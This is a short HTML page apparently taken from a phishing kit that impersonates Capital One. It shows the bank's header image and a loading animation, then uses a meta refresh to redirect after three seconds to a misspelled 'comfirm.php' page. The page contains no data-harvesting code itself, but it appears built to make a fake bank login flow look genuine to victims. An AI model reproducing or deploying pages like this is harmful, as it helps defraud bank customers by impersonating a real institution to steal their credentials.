<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Capital one | challenge</title>
<META HTTP-EQUIV="Refresh" CONTENT="3;URL=comfirm.php" >  
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<link rel="shortcut icon"
              href="images/mobile-app-icon.png"/>
			  


</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:75px; z-index:0"><a href="#"><img src="images/top.png" alt="" title="" border=0 width=1351 height=75></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:579px; top:205px; width:250px; height:250px; z-index:1"><img src="images/circle-loading-animation.gif" alt="" title="" border=0 width=250 height=250></div>
<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:568px; width:1350	px; height:193px; z-index:1"><img src="images/dw.png" alt="" title="" border=0 width=1350 height=193></div>


</body>
</html>